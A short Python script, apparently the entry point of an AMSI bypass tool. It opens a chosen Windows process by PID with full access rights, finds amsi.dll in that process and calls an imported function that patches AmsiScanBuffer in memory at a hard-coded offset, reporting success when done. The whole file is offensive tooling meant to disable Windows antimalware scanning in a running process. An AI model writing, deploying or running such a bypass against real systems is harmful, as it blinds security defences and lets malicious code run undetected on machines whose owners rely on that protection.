import sys
from _winapi import PROCESS_ALL_ACCESS
from main import patchAmsiScanBuffer, KERNEL32, getAmsiDllBaseAddress

def main():
    if len(sys.argv) != 2:
        print(f'[-] Usage: {sys.argv[0]} <pid>')
        sys.exit(1)
    pid = int(sys.argv[1])
    handle = KERNEL32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not handle:
        print(f'[-] OpenProcess Error: {KERNEL32.GetLastError()}')
        sys.exit(1)
    baseAddress = getAmsiDllBaseAddress(handle, pid)
    if not baseAddress:
        print('[-] Failed to find amsi.dll base address')
        sys.exit(1)
    funcAddress = baseAddress + 0x1f0
    patchAmsiScanBuffer(handle, funcAddress)
    print(f'[+] Successfully patched AmsiScanBuffer at {hex(funcAddress)}')

